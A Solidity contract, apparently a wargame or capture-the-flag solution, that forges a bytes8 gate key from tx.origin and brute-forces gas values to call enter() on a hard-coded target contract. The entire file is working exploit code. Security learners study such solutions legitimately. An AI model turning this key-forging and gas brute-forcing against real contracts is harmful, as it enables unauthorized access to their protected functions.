pragma solidity ^0.8.0;

interface IGate {
	function enter(bytes8 _gateKey) external returns (bool);
}

contract Hack {
	

	constructor() {
			IGate gate = IGate(address(0xFB4628f00D51d87DaD462a870C25319C5c8bB525));
		uint16 last = uint16(uint160(tx.origin));
		uint32 lastMid = uint32(last);
		uint64 res = (uint64(1) << 32) | uint64(lastMid);
		bytes8 key = bytes8(res);

		for (uint i = 0; i<1000; i++) {
			(bool success,) = address(gate).call{value: 0, gas: 16000 + i}(abi.encodeWithSelector(IGate.enter.selector, key));
			if (success) return ;
		}
	}
}
